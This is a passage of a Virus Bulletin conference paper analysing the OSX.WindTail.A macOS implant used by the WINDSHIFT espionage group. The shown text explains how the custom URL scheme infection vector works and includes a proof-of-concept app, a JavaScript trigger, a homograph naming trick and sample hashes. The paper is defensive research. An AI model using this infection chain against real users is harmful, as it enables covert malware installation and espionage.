<!DOCTYPE html>
<html lang="en" class="no-js">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<script type="text/javascript">var BOOTSTRAP_VERSION ="lumen";
	var BOOTSTRAP_JS_HEAD =1;
	var BOOTSTRAP_CDN_ENABLE =0; var BOOTSTRAP_NAVBAR_TYPE =0; var BOOTSTRAP_LOGO_OPTION =0; var BOOTSTRAP_NAVBAR =1; var BootstrapInputFix =true;var BootstrapNavbarLineHeightFix =true;var BOOTSTRAP_EDT= 0; </script>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<title>Virus Bulletin :: VB2019 paper: Cyber espionage in the Middle East: Unravelling OSX.WindTail</title>
<meta name="description" content="It’s no secret that many nation states possess offensive macOS cyber capabilities, though such capabilities are rarely publicly uncovered. However, when such tools are detected, they provide unparalleled insight into the operations and techniques utilized by advanced adversaries. In this paper, we’ll comprehensively dissect one such tool, OSX.WindTail.A, the first-stage macOS implant utilized by the WINDSHIFT APT group (which targeted individuals of a Middle-Eastern government). After analysing the malware’s unique infection vector, we’ll discuss its method of persistence and its capabilities. To conclude, we’ll present heuristic methods that can generically detect OSX.WindTail.A, as well as other advanced macOS threats." />
<meta name="generator" content="concrete5 - 5.6.3.5" />
<script type="text/javascript">
var CCM_DISPATCHER_FILENAME = '/index.php';var CCM_CID = 6696;var CCM_EDIT_MODE = false;var CCM_ARRANGE_MODE = false;var CCM_IMAGE_PATH = "/concrete/images";
var CCM_TOOLS_PATH = "/index.php/tools/required";
var CCM_BASE_URL = "https://www.virusbulletin.com";
var CCM_REL = "";

</script>
<link rel="shortcut icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="stylesheet" type="text/css" href="/concrete/css/ccm.base.css" />
<script type="text/javascript" src="/concrete/js/jquery.js"></script>
<script type="text/javascript" src="/concrete/js/ccm.base.js"></script>
<script type="text/javascript">
var COOKIES_ALLOWED=false;
</script>
<link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure.css" />
<!--[if lte IE 8]><link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure_ie.css" /><![endif]-->
<script type="text/javascript">
var COOKIES_DISCLOSURE_HIDE_INTERVAL=10;
</script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_hide.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap-overwrites.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/members.css" />
<script type="text/javascript" src="/packages/bootstrap/js/common/prettify.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/jquery.easing.1.3.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/bootstrap.min.js"></script>
<link rel="stylesheet" type="text/css" href="/libraries/css/jquery.fancybox.css" />
<script type="text/javascript" src="/libraries/js/jquery.fancybox.pack.js"></script>
<link rel="stylesheet" media="screen" type="text/css" href="/files/cache/css/bootstrap/typography.css" />
<script type="text/javascript" src="/index.php/tools/packages/free_cookies_disclosure/disclosure_i18n_js"></script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_ajax_form.js"></script>
<link rel="stylesheet" type="text/css" href="/concrete/blocks/page_list/view.css" />
<link rel="stylesheet" type="text/css" href="/blocks/expand_collapse_toc/templates/vbexpand/view.css" />
<script type="text/javascript" src="/blocks/expand_collapse_toc/js/jquery.color.js"></script>
<script type="text/javascript" src="/blocks/expand_collapse_toc/js/jquery.ba-hashchange.js"></script>
<script type="text/javascript" src="/blocks/expand_collapse_toc/js/expand.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/blocks/search/templates/VB_global_search/view.css" />
<link rel="stylesheet" type="text/css" href="/packages/travisn_spacer/css/ccm.tnspacer.css" />

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1" crossorigin="anonymous">

<script src="https://cdnjs.cloudflare.com/ajax/libs/prettify/r298/run_prettify.js" integrity="sha256-1SFdTXlsw0RkQ+iO0E91LDshGiIbPiTYqJto0px4wds=" crossorigin="anonymous"></script>
<!--[if gte IE 9]>
<script src="/packages/bootstrap/js/common/modernizr.js"></script>
<![endif]-->

<!--[if lt IE 9]>	
	
	<script src="/packages/bootstrap/js/common/html5shiv.js"></script>
	<script src="/packages/bootstrap/js/common/respond.min.js"></script>
	
<![endif]-->
</head>
<body data-spy="scroll" data-target=".bs-sidebar">

<div class="navbar  navbar-fixed-top navbar-default  bs-docs-nav">
<div class="navbar-inner">
<div class="container"><div class="row"><div class="col-sm-4 col-md-4 logo-position-1 col-logo">
<div class="navbar-header">
<button type="button" class="navbar-toggle btn_navbar_custom">
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button><div class="mobile-clearfix"></div><div class="navbar-brand navbar-brand-area"><a href="/"><img border="0" class="ccm-image-block" alt="" src="/files/4614/4535/7515/logo-big.png" width="339" height="92" /></a></div> </div>
</div><div class="col-sm-8 col-md-8 logo-position-1 col-nav"> <div class="nav-collapse collapse nav_collapse_custom navbar-collapse"> <div style="clear:both"></div>
<div class="vb-global-search-div">
<form action="/index.php/global-search-results/" method="get">
<fieldset>
<input name="search_paths[]" type="hidden" value="" />
<input name="query" type="text" class="vb-global-search" placeholder="Search site..." />
<input name="submit" type="submit" value="Search!" style="display:none" />
</fieldset>
</form>
</div>
<div class="tnSpacer" style="height:48px"></div>
<ul class="nav nav-pills"><li class=" nav-first nav-item-6299"><a href="/newsletter/" target="_self" class=" nav-first nav-item-6299 ">Newsletter</a></li><li class=" nav-item-260"><a href="/conference/" target="_self" class=" nav-item-260 ">VB Conference</a></li><li class=" nav-item-166"><a href="/testing/" target="_self" class=" nav-item-166 ">VB Testing</a></li><li class=" nav-path-selected active nav-item-160"><a href="/virusbulletin/" target="_self" class=" nav-path-selected active nav-item-160 ">Bulletin</a></li><li class=" nav-last nav-item-130"><a href="/blog/" target="_self" class=" nav-last nav-item-130 ">Blog</a></li></ul> </div>
</div>
</div><div class="clearfix"></div>
</div>
</div>
</div>
<div class="navbar-top-fixed-space "><div class="clearfix"></div></div>

<div class="container m-top-20">
<div class="row">
<div class="col-md-9 col-sm-9 col-lg-9">
<h1><a class="chapter" name="h1-vb2019-paper-cyber-espionage-middle-east-unravelling-osxwindtail"></a>VB2019 paper: Cyber espionage in the Middle East: unravelling OSX.WindTail</h1>
<h3><a class="chapter" name="h3-patrick-wardle"></a>Patrick Wardle</h3>
<p><em>Jamf, USA</em></p>
<hr />
<p> </p>
<div class="ccm-expand-collapse-toc">
<div id="ccm-expand-collapse-toc-title-15210" class="ccm-expand-collapse-toc-title ccm-expand-collapse-toc-closed" data-expander-speed="500">Table of contents</div><div id="ccm-expand-collapse-toc-content-15210" class="ccm-expand-collapse-toc-content"><p><a class="toc-level2" href="#h2-abstract">Abstract</a><br /> <a class="toc-level2" href="#h2-background">Background</a><br /> <a class="toc-level2" href="#h2-remote-mac-exploitation-custom-url-schemes">Remote Mac exploitation (via custom URL schemes)</a><br /> <a class="toc-level3" href="#h3-osxwindtail-persistence">OSX.WindTail: persistence</a><br /> <a class="toc-level3" href="#h3-osxwindtail-installation">OSX.WindTail: installation</a><br /> <a class="toc-level3" href="#h3-osxwindtail-string-decryption">OSX.WindTail: string decryption</a><br /> <a class="toc-level3" href="#h3-osxwindtail-payload">OSX.WindTail: payload</a><br /> <a class="toc-level3" href="#h3-osxwindtail-campc-servers">OSX.WindTail: C&amp;C servers</a><br /> <a class="toc-level3" href="#h3-osxwindtail-self-delete-logic">OSX.WindTail: self-delete logic</a><br /> <a class="toc-level3" href="#h3-osxwindtail-detection">OSX.WindTail: detection</a><br /> <a class="toc-level2" href="#h2-conclusion">Conclusion</a><br /> <a class="toc-level2" href="#h2-references">References</a></p><p>&nbsp;</p></div></div>
<h2><a class="chapter" name="h2-abstract"></a>Abstract</h2>
<p>It’s no secret that many nation states possess offensive <em>macOS</em> cyber capabilities, though such capabilities are rarely publicly uncovered. However, when such tools are detected, they provide unparalleled insight into the operations and techniques utilized by advanced adversaries. In this paper, we’ll comprehensively dissect one such tool, OSX.WindTail.A, the first-stage <em>macOS</em> implant utilized by the WINDSHIFT APT group (which targeted individuals of a Middle-Eastern government). After analysing the malware’s unique infection vector, we’ll discuss its method of persistence and its capabilities. To conclude, we’ll present heuristic methods that can generically detect OSX.WindTail.A, as well as other advanced <em>macOS</em> threats.</p>
<p> </p>
<h2><a class="chapter" name="h2-background"></a>Background</h2>
<p>At the Hack in the Box GSEC cybersecurity conference, Taha Karim (head of the malware research labs at <em>DarkMatter</em>) presented some rather intriguing research [<a href="#ref1">1</a>].</p>
<p>In his presentation, he detailed a new APT group (WINDSHIFT) that engaged in highly targeted cyber-espionage campaigns. A <em>Forbes</em> article [<a href="#ref2">2</a>] also covered Karim’s research, and noted that:</p>
<p style="padding-left: 30px;">‘[The APT] targeted specific individuals working in government departments and critical infrastructure across the Middle East.’ [<a href="#ref2">2</a>]</p>
<p>In his talk, Karim discussed the WINDSHIFT APT group and provided an overview both of their <em>macOS</em> exploitation techniques and of their malware (OSX.WindTail.A, OSX.WindTail.B and OSX.WindTape). However, deeper technical concepts were not covered (probably due to time constraints).</p>
<p style="padding-left: 30px;"><em>Note: The aim of this paper is not simply to regurgitate Karim’s excellent research. Instead, it aims to build from it by diving far deeper into the technical details of both the exploitation mechanism and the malware (OSX.WindTail.A) utilized by WINDSHIFT.</em></p>
<p>In this paper we’ll first cover the technical aspects of the rather novel exploitation mechanism employed by the attackers. Following this, we’ll dissect WINDSHIFT’s first-stage <em>macOS</em> implant (OSX.WindTail.A) by detailing its method of persistence, its capabilities and detection. Finally, we’ll (briefly) discuss various heuristic methods that can generically detect OSX.WindTail.A as well as other sophisticated macOS threats.</p>
<p> </p>
<h2><a class="chapter" name="h2-remote-mac-exploitation-custom-url-schemes"></a>Remote Mac exploitation (via custom URL schemes)</h2>
<p>In order to remotely infect their <em>macOS</em> targets, the WINDSHIFT APT group abused <em>macOS</em>’s support for custom URL schemes. Although user interaction was required, it was minimal and could be ‘influenced’ by the attacker. Moreover, the fact that this infection vector succeeded in the wild (against government targets in the Middle East) illustrates that the requirement for such user interactions unfortunately did not prevent infections.</p>
<p>In this section of the paper, we’ll first discuss custom document and URL schemes from the point of view of <em>macOS</em>. Following this, we’ll illustrate exactly how the WINDSHIFT APT group abused custom URL schemes to remotely infect their targets.</p>
<p>On <em>macOS</em>, applications can ‘advertise’ that they support (or ‘handle’) various document types and/or custom URL schemes. Think of it as an application saying, ‘if a user tries to open a document of type foo or a URL with a scheme of bar, I can handle that!’. You’ve surely encountered this feature of <em>macOS</em>. For example, when one double-clicks a .pdf document, Preview.app is automatically launched to handle the document. Meanwhile, in a browser, clicking a link to an application in the official <em>Mac App Store</em> launches <em>Apple</em>’s App Store.app to process the request. Unfortunately, the way <em>Apple</em> decided to implement (specifically, ‘register’) document handlers and custom URL schemes leaves them ripe for abuse!</p>
<p style="padding-left: 30px;"><em>Note: Though document handlers and URL schemes are slightly different, from an OS point of view, they are essential the same (and thus implemented in similar manners).</em></p>
<p>Previous research by the author [<a href="#ref3">3</a>] discussed a piece of adware (Mac File Opener) that abused custom document handlers as a stealthy way to achieve persistence. In short, as the malware ‘advertised’ that it supported over 200 types of files, whenever the user opened one of these file types, the malware would automatically be launched by the OS to handle (in theory to display) the document. Persistence with a twist!</p>
<p>Note: If there is already an application registered for a file type (e.g. .pdf, .html, etc.), it appears that it cannot (easily?) be usurped.</p>
<p>During the course of said research, the first question was: how did the Mac File Opener adware (or any application for that matter) ‘advertise’ which files it supported (and thus should be automatically invoked when such a documented was accessed by the user)? Secondly, how does the OS process and register this information? As the answers to both questions are detailed in [<a href="#ref3">3</a>], reading that paper is recommended, but we’ll briefly summarize them here as well.</p>
<p>So how does an application tell the OS what type(s) of file it is capable of handling? The answer is in its Info.plist file. As noted, the Mac File Opener adware ‘supports’ over 200 file types, which can be confirmed by dumping its Info.plist (note the ‘Document types’ array), as shown in Figure 1.</p>
<p><img class="framed" style="display: block; margin-left: auto; margin-right: auto;" src="/files/9415/7614/5025/Figure1-fakeFileOpener.png" alt="Figure1-fakeFileOpener.png" width="600" height="615" /><span class="centered-caption">Figure 1: Mac File Opener adware ‘supports’ over 200 file types, as confirmed by dumping its Info.plist.</span></p>
<p>In the ‘raw’ Info.plist, this information is stored in the CFBundleDocumentTypes array. <em>Apple</em> states:</p>
<p style="padding-left: 30px;">‘CFBundleDocumentTypes (Array - iOS, OS X) contains an array of dictionaries that associate one or more document types with your app. Each dictionary is called a type-definition dictionary and contains keys used to define the document.’ [<a href="#ref4">4</a>]</p>
<p>Below, observe Mac File Opener’s entry for the file type <em>.7z</em> (<em>7Zip</em>). Note the CFBundleTypeExtensions key, whose value is set to the file extension the adware claims to handle:</p>
<pre>$ cat "Mac File Opener.app/Contents/Info.plist"<br />&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br />&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://<br />www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;<br />&lt;plist version="1.0"&gt;<br />&lt;dict&gt;<br />    &lt;key&gt;BuildMachineOSBuild&lt;/key&gt;<br />    &lt;string&gt;14F27&lt;/string&gt;<br />    &lt;key&gt;CFBundleDevelopmentRegion&lt;/key&gt;<br />    &lt;string&gt;en&lt;/string&gt;<br />    &lt;key&gt;CFBundleDocumentTypes&lt;/key&gt;<br />    &lt;array&gt;<br />        &lt;dict&gt;<br />            &lt;key&gt;CFBundleTypeExtensions&lt;/key&gt;<br />            &lt;array&gt;<br />                &lt;string&gt;7z&lt;/string&gt;<br />            &lt;/array&gt;<br />            &lt;key&gt;CFBundleTypeName&lt;/key&gt;<br />            &lt;string&gt;DocumentType&lt;/string&gt;<br />            &lt;key&gt;CFBundleTypeOSTypes&lt;/key&gt;<br />            &lt;array&gt;<br />                &lt;string&gt;????&lt;/string&gt;<br />            &lt;/array&gt;<br />            &lt;key&gt;CFBundleTypeRole&lt;/key&gt;<br />            &lt;string&gt;Viewer&lt;/string&gt;<br />            &lt;key&gt;LSHandlerRank&lt;/key&gt;<br />            &lt;string&gt;Alternate&lt;/string&gt;<br />            &lt;key&gt;NSDocumentClass&lt;/key&gt;<br />            &lt;string&gt;Document&lt;/string&gt;<br />        &lt;/dict&gt;<br />    ...</pre>
<p>The second question is answered by understanding how <em>macOS</em> handles the ‘registration’ of these file or ‘document’ handlers. As noted in [<a href="#ref4">4</a>], this happens automatically as soon as the application is saved to the file system.</p>
<p>Specifically:</p>
<ul>
<li>An application (or malware) is downloaded (saved to the file system)</li>
<li>This triggers an XPC message sent to the launch services daemon (lsd)</li>
<li>The lsd parses the application’s Info.plist to extract and register any ‘document handlers’ to a persistent database.</li>
</ul>
<p>This can be observed via <em>macOS</em>’s built-in file monitor utility, ‘fs_usage’. For example, when the Mac File Opener.app adware is saved to disk, the launch services daemon automatically parses its Info.plist file:</p>
<pre>fs_usage -w -f filesystem | grep Info.plist<br />open     Mac File Opener.app/Contents/Info.plist lsd.16457<br />fstat64     F=4 lsd.16457<br />read     F=4 B=0x18a97 lsd.16457</pre>
<p>One can dump lsd’s database via the lsregister utility (found in /System/ Library/Frameworks/CoreServices.framework/Frameworks/ LaunchServices.framework/Support/). When invoked with the ‘-dump’ flag, it will display all applications that specify ‘document handlers’, which were automatically registered (by lsd). For example, one can see the malicious application Mac File Opener is present, along with the documents (file types) it registered for (e.g. .7z, etc.):</p>
<pre>$ lsregister -dump<br />...<br />path: /Users/user/Downloads/Mac File Opener.app<br />name: Mac File Opener<br />identifier: com.pcvark.Mac-File-Opener (0x80025f61)<br />executable: Contents/MacOS/Mac File Opener<br />--------------------------------------------------------<br />claim id: 31508<br />    name: DocumentType<br />    rank: Alternate<br />    roles: Viewer<br />    flags: doc-type<br />    bindings: .7z<br />...</pre>
<p>Once an application’s (or malware’s) document handlers have (automatically!) been registered, that application will automatically be invoked any time a user attempts to open a document whose type matches a registered handler.</p>
<p>Digging into <em>macOS</em> internals, this registration is handled by the launch services framework. Specifically, the ‘LSBundleCopyOrCheckNode’ method (and ‘_LSBundleCopyOrCheckNode_block_invoke’) handles this lookup (of matching a document type to a registered application) and then the execution of registered application:</p>
<pre>(lldb) b ___LSBundleCopyOrCheckNode_block_invoke<br />...<br />(lldb) x/gx $rdx<br />0x700000115c48: 0x00007fd3b4a9c520<br />(lldb) po 0x00007fd3b4a9c520<br />&lt;FSNode 0x7fd3b4a9c520&gt; { flags = 0x00000020, path = '/Users/user/Desktop/Mac File Opener.app' }</pre>
<p>In summary:</p>
<ul>
<li>Applications can ‘advertise’ that they handle various documents or file types.</li>
<li>The OS will automatically register those ‘document handlers’ as soon as the application is saved to the file system.</li>
<li>As files are opened, the ‘launch services’ database is consulted to execute the appropriate application to handle (read: open) the file.</li>
</ul>
<p>Now an examination of custom URL schemes and their handlers. Again, from the point of view of <em>macOS</em>, such URL scheme handlers are basically just document handlers, but for URLs.</p>
<p>This also means that custom URL scheme handlers:</p>
<ul>
<li>are registered automatically by <em>macOS</em> as soon as the application (that ‘advertises’ support for such handlers) is saved to the file system</li>
<li>will trigger the execution of the (automatically registered) handler application when the custom URL scheme is invoked.</li>
</ul>
<p>As both of these actions can be triggered from a web page, it should be easy to see where this all goes wrong!</p>
<p>Now, let’s walk through a proof of concept, to illustrate how an attacker (such as the WINDSHIFT APT group) could abuse custom URL scheme handlers to remotely infect a <em>Mac</em> (noting again that some user interaction is required).</p>
<p>The proof of concept is a simple <em>macOS</em> application. The logic of the application is irrelevant, however we must edit the app’s Info.plist file to ‘advertise’ that fact that we will support a custom URL scheme. In Xcode, we add a URL types array and specify the name of our scheme (windshift://) and a URL identifier, as shown in Figure 2.</p>
<p><img class="framed" style="display: block; margin-left: auto; margin-right: auto;" src="/files/6515/7614/5055/figure2-urlScheme.png" alt="figure2-urlScheme.png" width="618" height="364" /><span class="centered-caption">Figure 2: The URL types array (CFBundleURLTypes) contains a custom URL scheme and a URL identifier.</span></p>
<p>Examining the raw Info.plist illustrates that this maps to keys such as CFBundleURLTypes, CFBundleURLSchemes and CFBundleURLName:</p>
<pre>&lt;key&gt;CFBundleURLTypes&lt;/key&gt;<br />&lt;array&gt;<br />    &lt;dict&gt;<br />        &lt;key&gt;CFBundleURLSchemes&lt;/key&gt;<br />        &lt;array&gt;<br />            &lt;string&gt;windshift&lt;/string&gt;<br />        &lt;/array&gt;<br />        &lt;key&gt;CFBundleURLName&lt;/key&gt;<br />        &lt;string&gt;com.foo.bar.WindShift&lt;/string&gt;<br />    &lt;/dict&gt;<br />&lt;/array&gt;</pre>
<p>As soon as this application is compiled (or downloaded) the launch services daemon will parse its bundle (specifically its Info.plist), detect the presence of the custom URL scheme handlers, and register it (them). Again, note this all happens automatically.</p>
<p>To confirm registration of our ‘windshift://’ URL scheme, we dump the ‘launch services’ database (via lsregister -dump). Indeed, there is the proof of concept application (WindShift.app) along with the custom URL scheme (CFBundleURLSchemes: (windshift)):</p>
<pre>BundleClass: kLSBundleClassApplication<br />Container mount state: mounted<br />...<br />    path: ~/Projects/WindShift/DerivedData/WindShift/Build/Products/Debug/WindShift.app<br />    name: WindShift<br />    ....<br />    executable: Contents/MacOS/WindShift<br />....<br />    CFBundleURLTypes = (<br />        {<br />            CFBundleURLName = "com.foo.bar.WindShift";<br />            CFBundleURLSchemes = (<br />            windshift<br />        );<br />      }<br />    );<br />}<br />claim id:     386204<br />    name:     com.foo.bar.WindShift<br />    rank:     Default<br />    roles:    Viewer<br />    flags:     url-type<br />    bindings:     windshift:</pre>
<p>As the custom URL handler (‘windshift’) has (automatically) been registered with the system, the proof of concept application (Windshift.app) can be now be launched directly via a browser. To confirm, one can simply ‘browse’ to the custom URL scheme, windshift://.</p>
<p>While older versions of popular browsers would blindly launch the application, more recent versions will now request user approval:</p>
<p><img class="framed" style="display: block; margin-left: auto; margin-right: auto;" src="/files/cache/b50c7bc6adf3d1e2de8aa4b2ea22908a_f4413.png" alt="figure3-safariDefault.png" width="750" height="196" /></p>
<p class="centered-caption">Figure 3: User approval request.</p>
<p>Even today, if the user clicks ‘Allow’, <em>macOS</em> will launch the registered application:</p>
<p><img class="framed" style="display: block; margin-left: auto; margin-right: auto;" src="/files/cache/9331a726c5d1cfa1d56820e15238eeb1_f4414.png" alt="Figure4-launched.png" width="750" height="544" /></p>
<p class="centered-caption">Figure 4: macOS launches the registered application.</p>
<p>With a sufficient understanding of custom URL schemes, we now briefly discuss how to leverage them to remotely exploit <em>Mac</em> systems.</p>
<p>First, the target must be enticed to browse to a website under the attacker’s control. As we’ll see, the WINDSHIFT APT group (successfully) used phishing emails for this purpose.</p>
<p>Once the target visits the malicious website, the website can automatically initiate the download of an archive (.zip) file that contains the malicious application (which contains a custom URL scheme handler). If the <em>Mac</em> user is using <em>Safari</em>, the archive will be unzipped automatically, as <em>Apple</em> thinks it’s wise to automatically open ‘safe’ files. This fact is paramount, as it means the malicious application (vs. just a compressed zip archive) will now be on the user’s file system, which will automatically trigger the registration of any custom URL scheme handlers!</p>
<p>Now that the malicious app’s custom URL scheme has been registered (on the target’s system), code within the malicious web page can load or ‘browse’ to the custom URL (for example: windshift://). This is easy to accomplish in JavaScript: location.replace(‘windshift://’);.</p>
<p>Behind the scenes, <em>macOS</em> will look up the handler for this custom URL scheme – which, of course, is the malicious application (that was just downloaded). Once this lookup is completed, the OS will attempt to launch the malicious application to handle the URL request.</p>
<p>Luckily (for <em>Mac</em> users), as noted, in most recent versions of <em>Safari</em> this will trigger a warning (as shown in Figure 3).</p>
<p>However, the characters between the quotation marks in the alert are attacker-controlled, as they are the name of the application Thus, an attacker can easily make this pop-up look rather mundane, unintimidating, or even amusing:</p>
<p><img class="framed" style="display: block; margin-left: auto; margin-right: auto;" src="/files/5915/7614/6441/Figure5a-attachment.png" alt="Figure5a-attachment.png" width="508" height="184" /> <img class="framed" style="display: block; margin-left: auto; margin-right: auto;" src="/files/8715/7614/6474/Figure5b-apple.png" alt="Figure5b-apple.png" width="466" height="132" /></p>
<p><img class="framed" style="display: block; margin-left: auto; margin-right: auto;" src="/files/3015/7614/6504/figure5c-love.png" alt="figure5c-love.png" width="484" height="146" /></p>
<p class="centered-caption">Figure 5: The attacker controls the characters between the quotation marks.</p>
<p style="padding-left: 30px;"><em>Note: Normally an application cannot have an extension such as .txt or .com. However, as the name of the application can contain unicode characters, an attacker can leverage a homograph attack. This allows us to name the malicious application something like ‘Attachment.TXT’ (where the ‘X’ is really the Carian Letter X).</em></p>
<p>While recent versions of <em>Safari</em> will prompt the user before launching the application that has been registered to handle custom URL requests, older version of <em>Safari</em> (e.g. the default install on <em>El Capitan</em>) do not. Instead, such versions of <em>Safari</em> show no warning and blindly attempt to launch the (malicious) application.</p>
<p>Regardless of <em>Safari</em> version, an attacker will have one more hurdle: file quarantine.</p>
<p>File quarantine is responsible for the pop-up that is displayed when an application from the Internet is first launched.</p>
<p><img class="framed" style="display: block; margin-left: auto; margin-right: auto;" src="/files/8115/7614/6580/Figure6-quarantine.png" alt="Figure6-quarantine.png" width="840" height="348" /><span class="centered-caption">Figure 6: File quarantine is responsible for the warning.</span></p>
<p>From a security point of view, the good news is that some percentage of <em>Mac</em> users will click ‘Cancel’. Unfortunately, some will not – as was demonstrated by WINDSHIFT APT’s successful attacks.</p>
<p style="padding-left: 30px;"><em>Note: You might be wondering about Gatekeeper. In its default configuration, Gatekeeper allows signed applications. The malware used by the WINDSHIFT APT group was signed (as is most Mac malware these days). So Gatekeeper doesn’t even come into play!</em></p>
<p>Before diving into the specifics of the WINDSHIFT exploit, Figure 7 summarizes the custom URL scheme attack, with a diagrammatic overview.</p>
<p><img style="display: block; margin-left: auto; margin-right: auto;" src="/files/cache/92bf02fe7dd1f287f5aa3516bb00a881_f4419.png" alt="Figure7-diagram.png" width="800" height="542" /> <span class="centered-caption">Figure 7: Overview of custom URL scheme attack.</span></p>
<p>In order to initiate the exploitation of their <em>Mac</em> targets, the WINDSHIFT APT group abused several methods including malicious emails. Such emails would either contain the malware directly as an attachment or contain a phishing link to a malicious site that would trigger the custom URL scheme exploit.</p>
<p>In his presentation [<a href="#ref1">1</a>], Karim included the image shown in Figure 8, which illustrates a malicious WINDSHIFT email (that includes the malware as an attachment).</p>
<p><img class="framed" style="display: block; margin-left: auto; margin-right: auto;" src="/files/cache/6f223e55018095749616ce3e98f11440_f4420.png" alt="figure8-slides.png" width="840" height="307" /></p>
<p class="centered-caption">Figure 8: Malicious WINDSHIFT email [<a href="#ref1">1</a>].</p>
<p>Though no malware samples were shared by Karim, noted <em>Mac</em> security researcher Phil Stokes leveraged information contained in the above image, (i.e. the file name: Meeting_Agenda.zip) to uncover a WINDSHIFT malware sample on <em>VirusTotal</em>.</p>
<p>File: Meeting_Agenda.app<br />SHA-256: 842F8D9ACC11438DEF811F07EBAD5BC675DFFFBCF491F5F04209D31CCD6D18E5</p>
<p class="centered-caption"><a class="zoom-img" title="Figure 9: WINDSHIFT malware sample on VirusTotal." href="/files/4215/7614/6706/Figure9-meetingAgenda.png"><img class="framed" style="display: block; margin-left: auto; margin-right: auto;" src="/files/cache/4c0a5ea1caf38b286d906f9e5245cc7d_f4421.png" alt="Figure9-meetingAgenda.png" width="840" height="303" /></a>Figure 9: WINDSHIFT malware sample on VirusTotal.</p>
<p>Using the ‘similar-to:’ search modifier, the author was able to uncover three other samples (that at the time were not flagged as malicious by any anti-virus engine on the site), as shown in Figure 10.</p>
<p>NPC_Agenda_230617.app<br />SHA-1: FF90A290A7B9A11AE517E605ECED80920ED985E0F2CD4A6D265E72D8EE2F4802</p>
<p>Scandal_Report_2017.app<br />SHA-1: 3085C2AD23F35A2AC0A3A87631991EEB9497DBE68D19C8DD2869578A33ECBA0D</p>
<p>Final_Presentation.app<br />SHA-1: CEEBF77899D2676193DBB79E660AD62D97220FD0A54380804BC3737C77407D2F</p>
<p class="centered-caption"><a class="zoom-img" title="Figure 10: Three other samples were uncovered by using the ‘similar-to:’search modifier." href="/files/6815/7614/6769/figure10-similarities.png"><img class="framed" style="display: block; margin-left: auto; margin-right: auto;" src="/files/cache/9fe5e99160325c39f58252cff7285826_f4422.png" alt="figure10-similarities.png" width="840" height="325" /></a>Figure 10: Three other samples were uncovered by using the ‘similar-to:’search modifier.</p>
<p>Note that this malware (ab)uses <em>Microsoft Office</em> icons, probably to avoid raising suspicion.</p>
<p><img style="display: block; margin-left: auto; margin-right: auto;" src="/files/3715/7614/6817/figure11-icons.png" alt="figure11-icons.png" width="763" height="671" /> <span class="centered-caption">Figure 11: The malware uses Microsoft Office icons.</span></p>
<p style="padding-left: 30px;"><em>Note: For the remainder of this paper, we’ll focus on the ‘Final_Presentation’ application (SHA256: CEEBF77899D2676193DBB79E660AD62D97220FD0A54380804BC3737C77407D2F). This (and the other samples found on VirusTotal) are WINDSHIFT’s first-stage macOS implant, OSX.WindTail.A.</em></p>
<p>Unzipping Final_Presentation.zip reveals the Final_Presentation.app, which (as expected) is a standard <em>macOS</em> application bundle.</p>
<p><img style="display: block; margin-left: auto; margin-right: auto;" src="/files/8915/7614/6886/figure12-bundle.png" alt="figure12-bundle.png" width="431" height="331" /></p>
<p class="centered-caption">Figure 12: The Final_Presentation.app is a standard macOS application bundle.</p>
<p>The application’s main executable is named ‘usrnode,’ as specified in the application’s Info.plist file (CFBundleExecutable: usrnode):</p>
<pre>$ cat /Users/patrick/Downloads/WindShift/Final_Presentation.app/<br />Contents/Info.plist<br />&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br />&lt;plist version="1.0"&gt;<br />&lt;dict&gt;<br />    ...<br />    &lt;key&gt;CFBundleExecutable&lt;/key&gt;<br />    &lt;string&gt;usrnode&lt;/string&gt;<br />    ...<br />    &lt;key&gt;CFBundleIdentifier&lt;/key&gt;<br />    &lt;string&gt;com.alis.tre&lt;/string&gt;<br />    ...<br />    &lt;key&gt;CFBundleURLTypes&lt;/key&gt;<br />    &lt;array&gt;<br />        &lt;dict&gt;<br />            &lt;key&gt;CFBundleURLName&lt;/key&gt;<br />            &lt;string&gt;Local File&lt;/string&gt;<br />            &lt;key&gt;CFBundleURLSchemes&lt;/key&gt;<br />            &lt;array&gt;<br />                &lt;string&gt;openurl2622007&lt;/string&gt;<br />            &lt;/array&gt;<br />        &lt;/dict&gt;<br />    &lt;/array&gt;<br />    ...<br />    &lt;key&gt;LSMinimumSystemVersion&lt;/key&gt;<br />    &lt;string&gt;10.7&lt;/string&gt;<br />    ...<br />    &lt;key&gt;NSUIElement&lt;/key&gt;<br />    &lt;string&gt;1&lt;/string&gt;<br />&lt;/dict&gt;<br />&lt;/plist&gt;</pre>
<p>Other interesting keys in the Info.plist file include ‘LSMinimumSystemVersion’, which indicates that the (malicious) application is compatible with rather ancient versions of <em>OSX</em> (10.7, Lion), and the ‘NSUIElement’ key, which tells the OS to execute the application without a dock icon or menu (i.e. hidden).</p>
<p>However, the most interesting is the ‘CFBundleURLSchemes’ key (within the CFBundleURLTypes). As noted, this key holds an array of custom URL schemes that the application implements (here: openurl2622007). As previously discussed, this allows the malware to be launched directly from a malicious web page.</p>
